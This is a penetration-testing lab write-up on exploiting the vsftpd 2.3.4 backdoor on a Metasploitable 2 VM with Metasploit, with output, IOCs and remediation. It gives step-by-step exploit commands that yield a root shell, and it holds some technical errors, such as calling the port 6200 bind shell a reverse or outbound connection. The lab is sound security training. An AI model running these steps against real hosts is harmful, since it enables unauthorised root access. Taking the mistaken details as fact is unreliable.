# Lab 02: Metasploitable vsftpd 2.3.4 Backdoor Exploitation

## Objective

Exploit a known backdoor vulnerability in vsftpd (Very Secure FTP Daemon) version 2.3.4 running on Metasploitable 2 to gain remote code execution with root privileges. This lab demonstrates service exploitation, a core technique in penetration testing and incident investigation.

---

**Lab Status: ✅ COMPLETE** | **Date: 2026-07-09** | **Attack Duration: <5 seconds** | **Outcome: Root shell obtained**

---

## Environment

| Component | Details |
|---|---|
| Attacker | Kali Linux VM (10.0.2.15) |
| Target | Metasploitable 2 VM (10.0.2.4) |
| Vulnerable Service | vsftpd 2.3.4 (FTP) listening on port 21/tcp |
| Exploitation Tool | Metasploit Framework (`exploit/unix/ftp/vsftpd_234_backdoor`) |
| Network | VirtualBox NAT (isolated) |
| Payload | cmd/unix/interact (interactive shell) |

## Attack Steps

### Phase 1: Reconnaissance

1. **Network Connectivity Verification**
   ```bash
   ping -c 4 10.0.2.4
   ```
   Result: 0% packet loss — target is reachable.

2. **Service Discovery with Nmap**
   ```bash
   nmap -sV 10.0.2.4
   ```
   
   ![Nmap Service Discovery](./screenshots/03-nmap-service-discovery.png)
   
   Key findings:
   - **21/tcp: vsftpd 2.3.4** ← vulnerable service
   - 22/tcp: OpenSSH 4.7p1
   - 80/tcp: Apache httpd 2.2.8
   - 139/tcp, 445/tcp: Samba smbd 3.X
   - Additional services: MySQL, PostgreSQL, VNC, Tomcat, etc.
   
   The Nmap scan identified vsftpd 2.3.4 — a version with a publicly documented backdoor (CVE-2011-2523).

### Phase 2: Exploitation

3. **Launch Metasploit Framework**
   ```bash
   msfconsole
   ```

4. **Search for and configure vsftpd exploit module**
   ```
   search vsftpd
   use exploit/unix/ftp/vsftpd_234_backdoor
   set RHOSTS 10.0.2.4
   show options
   ```
   
   ![Metasploit Configuration](./screenshots/01-metasploit-search-exploit.png)
   
   Module selection and configuration verified:
   - Module: `exploit/unix/ftp/vsftpd_234_backdoor` (Rank: excellent)
   - RHOSTS: 10.0.2.4 ✓
   - RPORT: 21 (default) ✓
   - Payload: cmd/unix/interact ✓

5. **Execute the exploit**
   ```
   run
   ```
   
   Exploit execution output:
   ```
   [*] 10.0.2.4:21 - Banner: 220 (vsFTPd 2.3.4)
   [*] 10.0.2.4:21 - USER: 331 Please specify the password.
   [+] 10.0.2.4:21 - Backdoor service has been spawned, handling...
   [+] 10.0.2.4:21 - UID: uid=0(root) gid=0(root)
   [*] Found shell.
   [*] Command shell session 1 opened (10.0.2.15:39473 → 10.0.2.4:6200) at 2026-07-09 02:50:50 -0400
   ```

### Phase 3: Post-Exploitation Verification

6. **Confirm root access on target**
   ```bash
   whoami
   ```
   Response: `root`
   
   ![Successful Exploitation](./screenshots/01-metasploit-search-exploit.png)
   
   This confirms execution as the root user (UID 0), the highest privilege level on Linux. No credentials were required — the backdoor triggered automatically upon connection.

## Technical Details: The vsftpd 2.3.4 Backdoor

**Vulnerability:** CVE-2011-2523 — Backdoor Command Execution in vsftpd 2.3.4

**Root Cause:**
vsftpd versions 2.3.3 and 2.3.4 contained a malicious code snippet injected into the source. When a user connects to the FTP service with a username containing the string `:)` (a smiley face), the vulnerability triggers:
- The backdoor spawns a shell on **port 6200** (hardcoded)
- This shell runs with the privileges of the vsftpd process (in this case, root)
- No authentication is required — the mere presence of `:)` in the username activates it

**Exploitation Flow:**
1. Attacker connects to FTP port 21
2. Sends a username containing `:)` as a marker
3. vsftpd's backdoor code detects this and opens a reverse shell on port 6200
4. Attacker's connection is automatically forwarded to this shell
5. Attacker gains unauthenticated shell access as root

This is a "watering hole" style backdoor — inserted into the source code as a security test or sabotage.

## MITRE ATT&CK Mapping

| Tactic | Technique | Sub-Technique | ID |
|---|---|---|---|
| Initial Access | Exploit Public-Facing Application | — | [T1190](https://attack.mitre.org/techniques/T1190/) |
| Execution | Command and Scripting Interpreter | Unix Shell | [T1059.004](https://attack.mitre.org/techniques/T1059/004/) |
| Privilege Escalation | Exploitation for Privilege Escalation | — | [T1548](https://attack.mitre.org/techniques/T1548/) |

*Note:* No privilege escalation was necessary — the vulnerable service was already running as root.

## Findings / Indicators of Compromise (IOCs)

| IOC Type | Value | Significance |
|---|---|---|
| Vulnerable Service | vsftpd 2.3.4 on 10.0.2.4:21 | Service version directly matches CVE-2011-2523 |
| Exploit Behavior | Connection to port 6200 from attacker IP | Backdoor shell listener characteristic of this vulnerability |
| Attack Pattern | No authentication required for shell access | Confirms exploitation of hardcoded backdoor, not weak credentials |
| Compromised UID | uid=0(root) | Attacker obtained root-level shell access |
| Attack Timeline | Exploitation completed in <5 seconds | Speed consistent with automated backdoor, not manual brute-force |

## Remediation Recommendations

**Immediate:**
1. **Update vsftpd immediately** to version 2.3.5 or later, which removes the backdoor code.
   ```bash
   apt-get update && apt-get install vsftpd
   ```

2. **Disable FTP entirely if not required** — FTP transmits credentials in plaintext and has been deprecated in modern infrastructure. Use SFTP (SSH-based) instead.

3. **Implement network segmentation** — restrict FTP access to authorized administrative IPs only via firewall rules.

**Detection:**
4. **Monitor for unusual port 6200 connections** — any outbound connection from an FTP server to port 6200 is a strong indicator of vsftpd backdoor exploitation.

5. **Version-lock package updates** — in production, use version pinning to prevent automatic installation of vulnerable versions.
   ```bash
   apt-mark hold vsftpd
   ```

6. **Enable FTP access logging** — configure vsftpd logs to capture username attempts and flag any containing `:)`.

**Long-term:**
7. **Transition to SFTP** — replace FTP with SSH-based file transfer across all infrastructure.

8. **Implement code signing verification** — use package manager GPG verification and integrity checking to detect supply-chain backdoors.

## Lessons Learned

This lab demonstrated how a **single, small code injection** (the `:)` trigger and port 6200 backdoor) in widely-used open-source software can compromise thousands of systems, especially when:
- Administrators don't routinely check service versions
- Update cycles are delayed
- Network monitoring doesn't flag suspicious port usage

The speed of this exploitation (sub-second, completely unauthenticated) contrasts sharply with credential-based attacks (brute-force), showing why vulnerability patching is critical for public-facing services.

**Next iteration:** This lab could be extended with:
- **Forensic analysis:** What artifacts of the exploitation would remain in system logs? (FTP server logs, system call traces)
- **Detection engineering:** Writing Splunk/ELK detection rules for port 6200 anomalies
- **Defense testing:** Comparing detection quality before and after hardening (e.g., network segmentation, service monitoring)
